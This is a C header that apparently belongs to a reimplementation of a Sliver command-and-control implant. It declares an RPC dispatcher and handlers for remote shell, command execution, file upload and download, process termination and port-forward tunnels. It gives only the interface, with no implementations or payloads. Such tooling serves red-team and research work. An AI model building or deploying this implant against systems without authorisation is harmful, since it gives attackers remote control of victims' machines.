/* sliver/rpc.h - RPC dispatch: request envelope in, response envelope out.
 *
 * Sliver semantics: the server writes an Envelope{ID, Type, Data} on a fresh
 * yamux stream, the implant answers on another fresh stream with the *same* ID
 * and the response message type (e.g. MsgLsReq(5) -> MsgLs(6)).
 */
#ifndef SLIVER_RPC_H
#define SLIVER_RPC_H

#include "sliver/proto.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Result of dispatching one request. */
typedef struct {
  int handled;          /* 1 when a handler produced `message` */
  int no_response;      /* 1 when the handler already replied itself */
  uint32_t resp_type;   /* message type of `message` */
  sliver_buf_t message; /* response payload, owned by the dispatcher */
} sliver_rpc_result_t;

/* Handles `req` (already decoded). Always fills `result`: when no handler
 * matches, `handled` is 0 and the caller should answer with
 * UnknownMessageType. `result.message` must be released with
 * sliver_rpc_result_free(). */
void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *result);

void sliver_rpc_result_free(sliver_rpc_result_t *result);

/* Individual handlers (exposed for tests). Return 0 on success. */
int sliver_rpc_handle_ls(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_pwd(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_cd(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_rm(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_mkdir(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_ps(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_terminate(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_env(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_upload(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_execute(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *out);

/* Shell tunnel plumbing (used by the session to deliver peer data). */
typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);
void sliver_shell_set_sender(sliver_shell_send_fn fn);
void sliver_shell_shutdown(void);

/* Port forwarding (in-band TCP relay over a tunnel). */
int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out);
int sliver_portfwd_tunnel_data(const sliver_tunnel_data_t *td);
int sliver_portfwd_tunnel_close(uint64_t tunnel_id);
void sliver_portfwd_set_sender(sliver_shell_send_fn fn);
void sliver_portfwd_shutdown(void);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_RPC_H */



